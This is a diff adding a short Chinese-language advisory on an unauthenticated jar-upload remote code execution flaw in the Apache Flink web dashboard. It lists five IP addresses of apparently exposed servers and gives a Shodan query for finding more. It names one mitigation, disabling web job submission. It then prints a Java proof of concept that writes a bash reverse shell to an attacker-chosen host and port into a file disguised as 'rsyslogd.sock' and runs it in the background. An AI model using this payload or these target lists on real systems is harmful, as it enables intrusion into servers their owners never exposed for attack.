@@ -1,0 +1,44 @@
+Apache Flink WebUI RCE 漏洞
+
+影响版本:
+
+	Flink versions > 1.3.0
+
+描述:
+
+	启动Flink： ./bin/start-cluster.sh 
+
+	访问Web界面： http://ipaddress:8081/#/submit
+
+	提交一个新任务，没有任何的权限校验
+
+	上传一个恶意jar包文件，就能够控制这台服务器
+
+	搜索Shodan： https://www.shodan.io/search?query=Flink+Web+Dashboard
+
+	从搜索结果看，影响数百台机器，例如：
+	http://103.238.132.11:8081/#/submit
+	http://115.159.70.173:8081/#/submit
+	http://39.98.161.145:8081/#/submit
+	http://212.47.254.211:8081/#/submit
+	http://115.146.93.25:8081/#/submit
+	
+---------------------------------------------------------------------------------------------------
+缓解措施:
+
+	通过配置默认关闭 WebUI 上传任务功能
+	设置jobmanager.web.submit.enable 为 false
+
+---------------------------------------------------------------------------------------------------
+PoC：
+    public static void main(String[] args) {
+        System.out.println("java -jar FlinkRCE.jar 127.0.0.1 8888");
+        String ip = args[0];
+        String port = args[1];
+        String shellcode = "/bin/rm -rf ./rsyslogd.sock\n" + "/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+        writeShell(shellcode);
+        String cmd = "/bin/bash ./rsyslogd.sock &";
+        String result = execCmd(cmd, null);
+        System.out.println("CMD Done "+result);
+    }
+---------------------------------------------------------------------------------------------------
